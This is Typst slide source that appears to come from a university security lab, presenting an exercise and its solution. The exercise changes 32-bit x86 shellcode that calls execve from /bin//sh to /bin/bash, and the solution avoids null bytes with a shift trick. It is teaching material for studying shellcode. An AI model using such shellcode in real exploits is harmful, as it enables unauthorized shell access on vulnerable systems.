#import "@preview/polylux:0.3.1": *
#import "unipd.typ": *

#new-section[ Task 1.b ]

#slide[
  #let code = text(size: 18pt, ```asm
    ; Store the argument string on stack
    xor  eax, eax 
    push eax          ; Use 0 to terminate the string
    push "//sh"
    push "/bin"
    mov  ebx, esp     ; Get the string address

    ; Construct the argument array argv[]
    push eax          ; argv[1] = 0
    push ebx          ; argv[0] points "/bin//sh"
    mov  ecx, esp     ; Get the address of argv[]
  
    ; For environment variable 
    xor  edx, edx     ; No env variables 

    ; Invoke execve()
    xor  eax, eax     ; eax = 0x00000000
    mov   al, 0x0b    ; eax = 0x0000000b
    int 0x80
  ```)

  #let task = [
    - The code executes the `/bin//sh` binary (same as `/bin/sh`)

    - Change it to execute the `/bin/bash` binary

    - Avoid using double slashes (`//`)

    #v(15%)
  ]

  #place(dx: 62%, dy: 30%, box(width: 35%, task))
  #code
]

// #let elems = (`"\0\0\0\0"`, `"//sh"`, `"/bin"`, "0", "ptr")
// #grid(
//   columns: (6em,),
//   rows: (1.4em,) * 5,
//   row-gutter: 0pt,
//   column-gutter: 0pt,
//   ..elems.map(it => rect(width: 100%, height: 100%, outset: 0pt, align(center, it)))
// )

#new-section[ Task 1.b: Solution ]

#slide[
  #let code = text(size: 18pt, ```asm
    ; Store the argument string on stack
    mov  eax, "###h"
    shr  eax, 24
    push eax
    push "/bas"
    push "/bin"
    mov  ebx, esp     ; Get the string address

    ; Construct the argument array argv[]
    xor  eax, eax
    push eax          ; argv[1] = 0
    push ebx          ; argv[0] points "/bin/bash"
    mov  ecx, esp     ; Get the address of argv[]
  
    ; For environment variable 
    xor  edx, edx     ; No env variables 

    ; Invoke execve()
    xor  eax, eax     ; eax = 0x00000000
    mov   al, 0x0b    ; eax = 0x0000000b
    int 0x80
  ```)

  #let notes = uncover(2, mode: "transparent")[
    #align(center)[
      `"###h"`

      $arrow.b.double$

      `0x68232323`

      $arrow.b.double #place(dy: -0.3em, text(size: 18pt, "shift right"))$

      `0x00000068`

      $arrow.b.double$

      `"h\0\0\0"`
    ]
  ]

  #place(dx: 60%, dy: 15%, box(width: 40%, notes))
  #code
]

// TODO: Show stack?

#slide[
  #align(center, v(-10%) + scale(x: 90%, y: 90%, image("exe1b.png")))
]

#slide[
  #align(center, v(-10%) + scale(x: 90%, y: 90%, image("obj1b.png")))
]
